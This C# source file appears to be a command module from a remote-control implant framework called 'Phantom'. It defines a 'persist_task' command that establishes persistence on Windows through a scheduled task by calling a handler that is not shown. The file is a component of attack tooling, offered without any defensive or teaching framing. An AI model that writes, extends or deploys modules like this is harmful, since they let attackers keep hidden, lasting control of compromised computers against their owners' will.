using System;
using PhantomInterop.Classes;
using PhantomInterop.Interfaces;
using PhantomInterop.Structs.PhantomStructs;
using Phantom.Management.Persistence;

namespace Tasks
{
    public class persist_task : ICommand
    {
        public string command { get; } = "persist_task";
        public string description { get; } = "Establish persistence via Windows scheduled task";
        public string help { get; } = "persist_task";
        public string version { get; } = "1.0.0.0";
        public string id { get; } = "persist_task";

        public PhantomTaskResponse CreateTasking(PhantomTaskMessage task)
        {
            try
            {
                return PersistenceHandler.CreateScheduledTaskPersistence();
            }
            catch (Exception ex)
            {
                return new PhantomTaskResponse
                {
                    Completed = false,
                    UserOutput = $"Error creating scheduled task persistence: {ex.Message}"
                };
            }
        }
    }
}